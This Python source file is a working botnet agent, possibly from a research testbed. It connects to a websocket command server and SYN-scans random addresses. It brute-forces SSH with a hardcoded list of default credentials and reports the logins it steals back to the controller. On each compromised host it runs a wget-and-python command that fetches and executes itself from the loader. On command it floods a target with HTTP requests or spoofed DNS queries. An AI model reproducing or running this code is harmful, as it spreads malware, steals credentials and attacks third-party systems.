import json
import time
import asyncio
import websockets
import os
from threading import Thread, Lock
import ipaddress
import queue
import paramiko
import http.client
import string
import signal
import sys

from random import randint, choice, shuffle
from scapy.all import IP, TCP, sr1, RandShort, DNS, DNSQR, UDP
from uuid import getnode as get_mac


try:
    MOD_IP = sys.argv[1]
    OUR_DNS = sys.argv[2]
except:
    exit('MOD_IP or OUR_DNS value is not supplied.')


LOADER_PORT = 8000
MY_IP = "0.0.0.0"
LOCK_FILE = '/tmp/b'

MODULE = 'bot_'+str(get_mac())

CRED_LIST = [
    ("root","password"),
    ("root","qwerty"),
    ("admin","admin"),
    ("admin","root"),    
    ("admin","qwerty"),
    ("admin","password"),
    ("admin","12345"),
    ("root","root"),
    ("admin","00000"),
    ("pi","12345"),
    ("pi","raspberry"),  
    ("pi","qwerty1"),  
    ("pi","qwerty2"),  
    ("pi","qwerty3"),  
    ("pi","qwerty4"),  
    ("pi","qwerty5"),  
    ("pi","qwerty6"),  
    ("pi","qwerty7"),  
    ("pi","qwerty8"),  
    ("pi","qwert1"),  
    ("pi","qwert2"),  
    ("pi","qwert3"),  
    ("pi","qwert4"),  
    ("pi","qwert5"),  
    ("pi","qwert6"),  
    ("pi","qwert7"),  
    ("pi","qwert8"),  
    ("pi","qwert9"),  
    ("pi","qwert19"),  
    ("pi","qwert29"),  
    ("pi","qwert39"),  
    ("pi","qwert49"),  
    ("pi","qwert59"),  
    ("pi","qwert69"),  
    ("pi","qwert79"),  
    ("pi","qwert89"),  
    ("pi","qwert99"),  
    ("pi","qwert791"),  
    ("pi","qwert792"),  
    ("pi","qwert793"),  
    ("pi","qwert794"),  
    ("pi","qwert795"),  
    ("pi","qwert896"),  
    ("pi","qwert997"),  
    ("pi","qwert898"),  
    ("pi","qwert999"),  
    ("pi","qwert189"),  
    ("pi","qwert299"),  
    ("pi","qwert389"),  
    ("pi","qwert499"),  
    ("pi","qwert589"),  
    ("pi","qwert699"),  
]

MOD_PORT = 4567
COMM_HANDLE = None
SCAN_NETWORK = None
SCAN_PORT = None
SCAN_RATE = 1
OPEN_IPS = {}
LOCK = Lock()

# Get random IP address from given network.
def get_ip_address(i_network):
    net = ipaddress.IPv4Network(i_network)
    return net[randint(2, net.num_addresses-2)].exploded


def int_handler(sig, frame):
    os.remove(LOCK_FILE)
    sys.exit(0)

# Kill ssh processes. 
def kill_processes():
    # SSH is not killed in init bot.
    if os.path.isfile(LOCK_FILE):
        sys.exit("Already Running.")
    else:
        os.mknod(LOCK_FILE)
  
# attack class.
class attack(Thread):
    def __init__(self, i_type, i_ip, i_port):
        super(attack, self).__init__()
        self._type = i_type
        self._ip = i_ip
        self._port = i_port

    @staticmethod
    def get_random_string(i_len):
        return ''.join(choice(string.ascii_lowercase + string.digits) for _ in range(i_len))

    def run(self):       
        if self._type == 0:
            connection = http.client.HTTPConnection(self._ip, port=self._port)
            headers = {'Content-type': 'application/json'}
            for i in range(randint(30,40)):
                connection.request("GET", self.get_random_string(7), headers=headers)
                _ = connection.getresponse()
            connection.close()
        elif self._type == 1:
            for i in range(randint(30,40)):
                l_qname = 'somedomain.com'
                dns_req = IP(src=self._ip, dst=OUR_DNS)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=l_qname))
                _ = sr1(dns_req, timeout=1, verbose=0)
        else:
            pass

# SSH login thread.
class ssh_login(Thread):
    def __init__(self, ip, uname, pwd):
        super(ssh_login, self).__init__()
        self._uname = uname
        self._pwd = pwd
        self._ip = ip

    def run(self):
        global OPEN_IPS
        s = paramiko.SSHClient()
        s.load_system_host_keys()
        s.set_missing_host_key_policy(paramiko.WarningPolicy)

        try:
            s.connect(self._ip, 22, self._uname, self._pwd, timeout=5, auth_timeout=5)

            # Download malware from loader and execute. Suprisingly if ; is repalced with &&, does not work. 
            cmd = "wget -O /tmp/bot.py {}:{}/bot_multitry.py;python3 /tmp/bot.py {} {} &".format(MOD_IP, LOADER_PORT, MOD_IP, OUR_DNS)
            sin, sout, serr = s.exec_command(cmd)
            sout.channel.recv_exit_status()
            print('Login successful using {} {} {}.'.format(self._ip, self._uname, self._pwd))
            with LOCK:
                OPEN_IPS[self._ip]['login'] = True
                OPEN_IPS[self._ip]['uname'] = self._uname
                OPEN_IPS[self._ip]['pwd'] = self._pwd

        except paramiko.ssh_exception.NoValidConnectionsError:
            with LOCK:
                del OPEN_IPS[self._ip]
            print('Port closed for IP: {}. Deleting'.format(self._ip))
        except paramiko.ssh_exception.AuthenticationException:
            pass
        except:
            print(sys.exc_info())
            #print('Login Failed.')
        finally:
            s.close()

# TCP scan thread.
class tcp_scan(Thread):
    def __init__(self, ip, port):
        super(tcp_scan, self).__init__()
        self._port = port
        self._ip = ip

    def run(self):
        global OPEN_IPS
        p = IP(dst = self._ip)/TCP(sport=RandShort(), dport=self._port, flags='S')    
        resp = sr1(p, timeout=2, verbose=0)
        if resp is None:
            pass
            #print("[X] ip {} NOT open.".format(self._ip))
        elif resp.haslayer(TCP):
            if resp.getlayer(TCP).flags == 0x12:
                #send_rst = sr(IP(dst=ip)/TCP(sport=src_port, dport=SCAN_PORT, flags='AR'), timeout=1)
                if not self._ip in OPEN_IPS.keys() and not self._ip == MY_IP:
                    with LOCK:
                        OPEN_IPS[self._ip] = {'uname':"", 'pwd':"", 'login':False, 'reported':False}
                    print("[<<>>] IP {} open.".format(self._ip))
            elif resp.getlayer(TCP).flags == 0x14:
                pass
                #print("[X] ip {} NOT open.".format(self._ip))

# Attack handler.
async def attack_handler(i_msg):
    ip = i_msg['ip']
    port = int(i_msg['port'])
    code = int(i_msg['code'])
    
    t = attack(code, ip, port)
    t.start()


# SSH login routine.
async def login():
    global OPEN_IPS
    
    duration = 10.0
    while True:
        if SCAN_RATE == 0:
            duration = 15.0
            max_logins = 2
        elif SCAN_RATE == 1:
            max_logins = randint(5,10)
            duration = 10.0
        elif SCAN_RATE == 2:
            duration = 5.0
            max_logins = randint(15,20)
        else:
            pass

        print('[D] Login Thread.')

        # Fails to execute if increased.
        max_logins=2
        with LOCK:
            kk = OPEN_IPS.copy()

        for ip in kk.keys():
            if kk[ip]['login'] is False:
                for _ in range(max_logins):
                    vals = choice(CRED_LIST)
                    login_attempt = ssh_login(ip, vals[0], vals[1])
                    login_attempt.start()


        for ip in OPEN_IPS.keys():
            if OPEN_IPS[ip]['reported'] is False and OPEN_IPS[ip]['login'] is True:
                with LOCK:
                    OPEN_IPS[ip]['reported'] = True
                print('[D] Report IP {} for login.'.format(ip))
                asyncio.ensure_future(send_event('EVT_REPORT', {'ip': ip, 'uname': OPEN_IPS[ip]['uname'], 'pwd':OPEN_IPS[ip]['pwd']}))

        await asyncio.sleep(duration)

# Scanner routine.
async def scan():
    duration = 5.0

    while True:
        max_ips = 20
        if SCAN_RATE == 0:
            max_ips = 4
            duration = 15.0
        elif SCAN_RATE == 1:
            max_ips = 6
            duration = 7.0
        elif SCAN_RATE == 2:
            max_ips = 10
            duration = 2.0
        else:
            pass

        for _ in range(randint(max_ips/2, max_ips)):
            t_scan = tcp_scan(get_ip_address(choice(SCAN_NETWORK)), int(choice(SCAN_PORT)))       
            t_scan.start()

        #print("[D] OPEN_IPS: {}".format(OPEN_IPS))
        await asyncio.sleep(duration)

# Process msg.
async def process_msg(msg):   
    global SCAN_NETWORK
    global SCAN_PORT
    global SCAN_RATE

    try:
        msg = json.loads(msg)
    except:
        print("Invalid data")
        return
    if not 'event' in msg.keys():
        print("Event not in the message.")
        return

    event = msg['event']
    payload = msg['data']

    if event == "EVT_ATTACK":

        try:
            asyncio.ensure_future(attack_handler(payload))
        except:
            print("Unable to parse event msg {}.".format(msg))     
            return
 
    elif event == "EVT_SETUP":
        SCAN_NETWORK = payload['ip'].split(',')
        SCAN_RATE = int(payload['frequency'])
        SCAN_PORT = payload['port'].split(',')

    elif event == "EVT_INIT":
        SCAN_NETWORK = payload['ip'].split(',')
        SCAN_RATE = int(payload['frequency'])
        SCAN_PORT = payload['port'].split(',')

        kill_processes()
        
        print('[D] Starting Scan.')
        print('[D] Starting Login Attempts.')
        asyncio.ensure_future(scan())
        asyncio.ensure_future(login())

    else:
        print("Unknown event {} received.".format(event))

# Receiver events.
async def recv_event():
    global COMM_HANDLE

    try:
        while (True):
            msg = await COMM_HANDLE.recv()
            print("[D] Received msg {}".format(msg))
            await process_msg(msg)

    except ConnectionRefusedError :
        print("[E] Unable to connect to Master")

    except websockets.exceptions.ConnectionClosed:
        print("[E] Master closed connection")

    COMM_HANDLE = None

    asyncio.ensure_future(comm_connect())

# Send event.
async def send_event(event, data):

    global MODULE, COMM_HANDLE

    if not COMM_HANDLE :
        print("[E] Controller not connected. Discarding")
        return

    msg = {}
    msg['timestamp'] = time.time()
    msg['event'] = event
    msg['device'] = MODULE
    msg['data'] = data

    msg = json.dumps(msg)
    print("Sending event")
    await COMM_HANDLE.send(msg)

# Connect event.
async def comm_connect():
    global COMM_HANDLE, MY_ADDR, MOD_IP 
    try:
        COMM_HANDLE = await websockets.connect('ws://{}:{}/{}'.format(MOD_IP, MOD_PORT, MODULE))
        MY_ADDR = COMM_HANDLE.local_address[0]
        print("[D] Connected to Master. My address is {}".format(MY_ADDR))
        asyncio.ensure_future(recv_event())
    except:
        COMM_HANDLE = None
        await asyncio.sleep(2)
        asyncio.ensure_future(comm_connect())


signal.signal(signal.SIGHUP, signal.SIG_IGN)
signal.signal(signal.SIGINT, int_handler)
EVENT_LOOP = asyncio.get_event_loop()
asyncio.ensure_future(comm_connect())

print('[D] Starting module {} with {}:{}'.format(MODULE, MOD_IP, MOD_PORT))

try:
    EVENT_LOOP.run_forever()
except KeyboardInterrupt:
    pass
finally:
    if os.path.exists(LOCK_FILE):
        os.remove(LOCK_FILE)
    EVENT_LOOP.close()
